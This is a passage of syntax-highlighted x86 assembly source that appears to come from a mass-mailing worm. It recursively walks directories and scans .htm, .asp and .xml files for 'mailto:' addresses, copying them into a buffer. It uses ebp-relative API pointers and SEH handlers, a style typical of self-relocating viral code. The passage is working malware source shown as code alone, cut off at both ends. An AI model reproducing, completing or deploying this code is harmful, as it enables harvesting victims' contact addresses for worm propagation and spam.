    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;save search handle</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_SD</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindNext</span><span class="sc0">
</span><span class="sc5">_SD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFiles</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;restore search handle</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">dotdot</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">FindNext</span><span class="sc0">    
</span><span class="sc5">Is_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cFileName</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;do action</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ScanFileForMails</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindNextFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@find</span><span class="sc0">                   </span><span class="sc1">;move to next file</span><span class="sc0">
</span><span class="sc5">ExitFind</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfind</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindClose</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;close the file handle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;exit search</span><span class="sc0">

    </span><span class="sc5">dotdot</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">".."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000010h</span><span class="sc0">
    

</span><span class="sc1">;scan htm,asp,xml files for emails</span><span class="sc0">
</span><span class="sc1">;input:</span><span class="sc0">
</span><span class="sc1">;   eax - file name</span><span class="sc0">
</span><span class="sc1">;output:</span><span class="sc0">
</span><span class="sc1">;   none    </span><span class="sc0">
</span><span class="sc5">ScanFileForMails</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MailSearchErr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc5">@gSize</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">     </span><span class="sc1">;get size of file name</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ChkExt</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@gSize</span><span class="sc0">
</span><span class="sc5">ChkExt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc3">"mth."</span><span class="sc0">    </span><span class="sc1">;is .htm ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc3">"psa."</span><span class="sc0">    </span><span class="sc1">;is .asp ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc3">"lmx."</span><span class="sc0">    </span><span class="sc1">;is .xml ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitMS</span><span class="sc0">
</span><span class="sc5">_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;file name</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INVALID_HANDLE_VALUE</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitMS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CreateFileMapping</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_CloseF</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_CloseM</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">14000h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">_CloseM</span><span class="sc0">                 </span><span class="sc1">;dont scan files which are &gt; 80k</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">_CloseM</span><span class="sc0">                 </span><span class="sc1">;dont scan file which are &lt; 512 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_FSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;map file into memory</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_CloseM</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;file in the memory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_FSize</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;size of file</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Unmap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MailsMemory</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;where to store mails</span><span class="sc0">
</span><span class="sc5">@lm</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_1_</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@lm</span><span class="sc0">
</span><span class="sc5">_1_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastMailPointer</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">@checkM</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"liam"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotMail</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc3">":otl"</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotMail</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                  </span><span class="sc1">;skip the mailto:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NewMail</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">checkC</span><span class="sc0">
</span><span class="sc5">@lm2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">           </span><span class="sc1">;move to last mail</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_2_</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">         </span><span class="sc1">;and leave 0 between the</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">checkC</span><span class="sc0">                  </span><span class="sc1">;new mail to the last mail</span><span class="sc0">
</span><span class="sc5">_2_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@lm2</span><span class="sc0">
</span><span class="sc5">checkC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'?'</span><span class="sc0">          </span><span class="sc1">;check char</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_Stop</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'"'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">_Stop</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'@'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@cpyM</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@cpyM</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">7ah</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">BadMail</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">30h</span><span class="sc0">
    </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">@cpyM</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">BadMail</span><span class="sc0">
</span><span class="sc5">@cpyM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastMailPointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">checkC</span><span class="sc0">
</span><span class="sc5">_Stop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NumberOfEmails</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NewMail</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LastMailPointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">NotMail</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@checkM</span><span class="sc0">
</span><span class="sc5">Unmap</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">_CloseM</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">_CloseF</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitMS</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;exit mail search</span><span class="sc0">


</span><span class="sc5">MailSearchErr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;restore stack</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapbase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">UnMapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
